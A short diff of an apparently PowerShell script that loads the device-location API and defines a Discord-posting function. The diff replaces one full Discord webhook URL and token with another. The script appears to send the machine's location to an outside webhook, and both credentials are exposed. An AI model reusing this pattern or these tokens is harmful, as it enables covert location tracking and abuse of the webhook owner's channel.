@@ -1,7 +1,7 @@
 Add-Type -AssemblyName System.Device  # Required to access System.Device.Location namespace
 
 # Your Discord webhook URL (fill this in)
-$webhookUrl = 'https://discord.com/api/webhooks/1385736055193600160/bYek8dVluPbkCuuntHuf_4V1_OaJeTy5Tw13GeeaKx8PJORL2WjzniYT-gah_gUwTR8M'
+$webhookUrl = 'https://discord.com/api/webhooks/1386838200089182319/DFvenBNwWaKMzXWX-HfhQy6IkkuGCo4yAcGKuTDs_IYpvrlWrXv0bnIyUNiV2GwYLvju'
 
 function Send-DiscordEmbed {
     param(
